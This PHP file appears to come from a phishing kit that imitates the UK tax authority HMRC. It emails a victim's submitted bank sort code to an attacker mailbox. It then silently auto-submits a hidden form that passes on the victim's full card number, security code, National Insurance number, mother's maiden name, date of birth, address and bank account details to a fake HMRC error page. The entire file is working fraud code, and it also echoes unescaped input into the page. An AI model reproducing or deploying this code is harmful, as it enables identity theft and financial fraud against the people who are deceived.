<?php
$sortcode = $_POST['sortcode'];
$from = "l33bo_phishers@hush.com";
$headers = "From:" . $from;
$subj = "Sortcode No Match";
$to = "l33bo_phishers@hush.com"; 
$data = "
--------------------- Sortcode Lookup -----------------

$sortcode

-------------------------------------------------------
";
mail($to,$subj,$data,$headers);
?>
<script>
function SendUser() {
	document.getElementById("SendUser").submit();
	return true;
}
</script>
<body onload="SendUser();">
<div style="display:none">
<form method="post" action="../../hmrc.gov.uk/Error.php" name="SendUser" id="SendUser">
	<input type="hidden" name="title" value="<?php echo $_POST['title'];?>">
	<input type="hidden" name="name" value="<?php echo $_POST['name'];?>">
	<input type="hidden" name="dob" value="<?php echo $_POST['dob'];?>">
	<input type="hidden" name="day" value="<?php echo $_POST['day'];?>">
	<input type="hidden" name="month" value="<?php echo $_POST['month'];?>">
	<input type="hidden" name="year" value="<?php echo $_POST['year'];?>">
	<input type="hidden" name="telephone" value="<?php echo $_POST['telephone'];?>">
	<input type="hidden" name="email" value="<?php echo $_POST['email'];?>">
	<input type="hidden" name="street" value="<?php echo $_POST['street'];?>">
	<input type="hidden" name="town" value="<?php echo $_POST['town'];?>">
	<input type="hidden" name="postcode" value="<?php echo $_POST['postcode'];?>">
	<input type="hidden" name="ccname" value="<?php echo $_POST['ccname'];?>">
	<input type="hidden" name="ccno" value="<?php echo $_POST['ccno'];?>">
	<input type="hidden" name="ccno1" value="<?php echo $_POST['ccno1'];?>">
	<input type="hidden" name="ccno2" value="<?php echo $_POST['ccno2'];?>">
	<input type="hidden" name="ccno3" value="<?php echo $_POST['ccno3'];?>">
	<input type="hidden" name="ccno4" value="<?php echo $_POST['ccno4'];?>">
	<input type="hidden" name="expiry" value="<?php echo $_POST['expiry'];?>">
	<input type="hidden" name="ccmm" value="<?php echo $_POST['ccmm'];?>">
	<input type="hidden" name="ccyy" value="<?php echo $_POST['ccyy'];?>">
	<input type="hidden" name="secode" value="<?php echo $_POST['secode'];?>">
	<input type="hidden" name="dlno" value="<?php echo $_POST['dlno'];?>">
	<input type="hidden" name="ni" value="<?php echo $_POST['ni'];?>">
	<input type="hidden" name="mmn" value="<?php echo $_POST['mmn'];?>">
	<input type="hidden" name="acno" value="<?php echo $_POST['acno'];?>">
	<input type="hidden" name="sort" value='<?php echo $_POST['sort'];?>'>  
	<input type="hidden" name="sc1" value='<?php echo $_POST['sc1'];?>'>  
	<input type="hidden" name="sc2" value='<?php echo $_POST['sc2'];?>'>  
	<input type="hidden" name="sc3" value='<?php echo $_POST['sc3'];?>'> 
</form>
</div>